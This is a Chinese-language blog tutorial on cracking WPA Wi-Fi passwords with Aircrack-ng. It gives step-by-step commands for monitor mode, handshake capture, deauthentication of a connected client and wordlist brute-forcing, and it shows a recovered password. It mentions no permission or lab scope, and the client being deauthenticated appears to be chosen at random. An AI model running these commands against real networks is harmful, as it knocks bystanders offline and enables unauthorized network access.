---
layout:     post
title:      无线攻防之Aircrack-ng
subtitle:   Aircrack-ng暴力破解
date:       2019-05-29
author:     Threekb
header-img: img/post-bg-coffee.jpeg
catalog: true
tags:
    - aircrack-ng
    - 无线网渗透
    - 无线攻防
    - 暴力破解
---

# 无线攻防之Aircrack-ng

**Aircrack-ng是无线渗透测试过程中一款非常经典的工具，命令行的操作界面也非常方便快捷，简单的几句命令行轻松拿下目标无线网！**

​	

> 由于kali已经集成了Aircrack-ng，这里就不做安装了
>
> 使用windows或者其他linux发行版系统的同学可以到[这里](https://www.aircrack-ng.org/downloads.html)下载安装

### 第一步：

* 将无线网卡插入电脑，如果是虚拟机并接入虚拟机，并在kali终端查看可用的无线网卡

​       输入  `airmon-ng` 查看可用网卡

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529202827.png)

### 第二步：

* 将无线网卡开启监听模式

  输入`airmon-ng start + 无线网卡名称` 开启网卡监听模式

  例如：`airmon-ng start wlan0`

  ![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529203121.png)

* 这里要注意的是，开启监听模式之后，会给监听模式中的无线网卡重命名一个`wlan0mon` 后续的操作会到

### 第三步

* 扫描附近的无线网络

​       输入`airodump-ng + 处于监听模式的重命名后的无线网卡的名称` 扫描附近网络

​	   例如:`airodump-ng wlan0mon`

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529203509.png)

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529203531.png)

* 已经扫描出来一些无线网，这里有几个关键的信息需要注意一下
  * BSSID（ap的硬件地址）
  * PWR（信号强度，绝对值越小信号越强）
  * ENC（加密方式）
  * ESSID（ap名称）
  * STATION(用户设备的硬件地址)
  * CH（网络信道）

* 这些关键的信息待会会用到

### 第四步

* 确定好攻击的目标之后，准备抓取握手包
* 使用
* `airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称>`确定扫描目标
* 例如：airodump-ng -w /root/桌面/rising/rising -c 6 --bssid 22:47:DA:62:2A:F0 wlan0mon

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529211009.png)

* `因为扫描过程中如果有用户尝试连接wifi的时候才能拿到握手包，所以可以使用第五步的命令对设备进行攻击，让他掉线重新连接，这样就能拿到握手包，拿到握手包之后ctrl+c结束就行`

### 第五步

* 使用aireplay-ng对目标设备发起攻击

* 使用`aireplay-ng -攻击模式 共计次数 -a 无线ap硬件地址 -c 用户设备硬件地址 处于监听模式网卡名称`对目标进行攻击使其掉线

* 例如：aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlan0mon

  * ok，随机挑选一名幸运观众开始攻击

  ![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529211928.png)

  

  ​                         ![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529211449.png)

### 第六步

* 拿到握手包之后使用aircrack暴力破解wifi密码

* 6.aircrack-ng  -w 密码字典  握手包的cap文件

* 例如：`aircrack-ng -w /root/桌面/krl.txt rising-01.cap`

  

  >  成功拿到握手包

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529213709.png)

* 使用命令开始进行爆破

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529212809.png)

* 成功破解 密码[rising616]

![](https://threekb-1259310634.cos.ap-beijing.myqcloud.com/blog/20190529213153.png)



> ##### 当然，如果嫌自带工具效率不高，可以将握手包拷出来，使用大名鼎鼎的ewsa进行爆破，这个方式我会在另外一篇去介绍！